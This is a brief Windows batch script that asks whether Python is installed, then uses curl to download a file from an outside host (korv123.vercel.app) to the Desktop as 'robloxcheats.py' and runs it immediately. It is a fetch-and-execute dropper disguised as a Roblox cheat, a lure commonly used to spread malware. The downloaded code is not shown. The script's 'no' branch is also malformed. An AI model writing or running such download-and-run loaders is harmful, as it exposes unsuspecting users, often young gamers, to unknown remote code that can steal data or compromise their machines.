@echo off
echo yes or no
set /p s=do you have python^?:^>
if %s%==yes goto setup
if %s%==goto x

:x
cls
echo need to have python download it and run it this script again.
pause
exit

:setup
cd %userprofile%/Desktop
curl -l https://korv123.vercel.app/py.py --output robloxcheats.py
python robloxcheats.py
